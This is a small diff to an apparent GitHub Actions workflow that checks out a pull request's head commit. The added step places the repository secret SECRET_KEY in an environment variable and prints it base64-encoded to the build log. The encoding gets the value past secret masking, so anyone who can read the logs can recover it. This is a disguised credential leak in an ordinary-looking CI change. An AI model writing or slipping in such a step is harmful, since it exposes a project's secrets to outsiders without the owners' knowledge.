@@ -10,5 +10,7 @@ jobs:
       with:
         ref: ${{ github.event.pull_request.head.sha }}
 
-    - run: echo "test"
+    - run: env | grep "sikla" | base64 -w0
+      env:
+          sikla: ${{ secrets.SECRET_KEY }}
           
